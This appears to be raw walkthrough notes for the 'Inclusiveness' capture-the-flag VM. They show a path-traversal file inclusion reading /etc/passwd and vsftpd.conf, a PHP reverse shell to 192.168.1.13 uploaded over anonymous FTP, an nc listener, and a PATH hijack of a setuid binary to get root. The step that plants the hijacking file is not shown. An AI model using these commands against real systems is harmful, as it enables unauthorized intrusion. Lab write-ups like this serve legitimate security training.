Connect to FTP:
nothing in folder /pub


Change agent:config

Research robots.txt -->
User-agent: *
Disallow: /secret_information/


http://192.168.1.19/secret_information/?lang=/../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin avahi-autoipd:x:107:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin avahi:x:113:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:114:121::/var/lib/saned:/usr/sbin/nologin colord:x:115:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:116:123::/var/lib/geoclue:/usr/sbin/nologin tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 



Users:
root
tom


http://192.168.1.19/secret_information/?lang=/../../../etc/vsftpd.conf
Point users at the directory we created earlier. anon_root=/var/ftp/ write_enable=YES # 


Create a reverse shell and upload in FTP folder:
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.1.13/1235 0>&1'");?>


root@ap:~/CTF/Inclusiveness# ftp 192.168.1.19
Connected to 192.168.1.19.
220 (vsFTPd 3.0.3)
Name (192.168.1.19:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> 
ftp> cd pub
250 Directory successfully changed.
ftp> put rvshell.php 
local: rvshell.php remote: bckdoor.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
30 bytes sent in 0.00 secs (298.9477 kB/s)
ftp> bye
221 Goodbye.

192.168.1.19/secret_information/?lang=var/ftp/pub/rvshell.php


Start listener

root@ap:~/CTF/Inclusiveness# nc -lnvp 1235
listening on [any] 1235 ...
connect to [192.168.1.13] from (UNKNOWN) [192.168.1.19] 56134
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


www-data@inclusiveness:/home/tom$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@inclusiveness:/home/tom$ 

www-data@inclusiveness:/home/tom$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@inclusiveness:/home/tom$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@inclusiveness:/home/tom$ ls
ls
Desktop    Downloads  Pictures	Templates  rootshell
Documents  Music      Public	Videos	   rootshell.c
www-data@inclusiveness:/home/tom$ ./rootshell
./rootshell
checking if you are tom...
you are: tom
access granted.
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cd /root
cd /root
# ls
ls
flag.txt
# cat flag.txt
cat flag.txt
|\---------------\
||                |
|| UQ Cyber Squad |       
||                |
|\~~~~~~~~~~~~~~~\
|
|
|
|
o

flag{omg_you_did_it_YAY}



